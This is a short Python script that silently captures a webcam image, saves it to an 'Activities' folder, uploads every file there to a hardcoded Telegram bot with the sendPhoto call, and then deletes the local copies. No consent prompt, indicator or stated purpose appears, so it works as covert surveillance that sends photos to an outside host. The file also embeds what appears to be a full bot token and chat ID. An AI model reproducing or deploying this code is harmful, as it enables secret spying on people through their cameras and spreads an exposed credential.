import datetime
import os
import time

import cv2
import requests

BASE_URL = "https://api.telegram.org/bot7735792806:AAEG59zResZlHns4gvu0s-8rGwYQZzyD5VE"
CHAT_ID = "1802424594"
FOLDER_NAME = os.path.join(os.path.dirname(os.path.realpath(__file__)), "Activities")


def main():
    video_capture = cv2.VideoCapture(0)

    if not video_capture.isOpened():
        print("if not isOpened()")

    time.sleep(3)
    captured, frame = video_capture.read()

    while not captured:
        captured, frame = video_capture.read()

    time.sleep(1)
    video_capture.release()
    now = datetime.datetime.now()

    cv2.imwrite(
        os.path.join(FOLDER_NAME, f"{now.day}-{now.hour * 60 + now.minute}.png"),
        frame
    )

    for item in os.listdir(FOLDER_NAME):
        item_path = os.path.join(FOLDER_NAME, item)

        if os.path.isdir(item_path):
            continue

        with open(item_path, "rb") as image:
            response = requests.post(
                f"{BASE_URL}/sendPhoto",
                data={"chat_id": CHAT_ID},
                files={"photo": image}
            )

        if not response.ok:
            print("if not response.ok")

        os.remove(item_path)
    print("print")


if __name__ == "__main__":
    main()
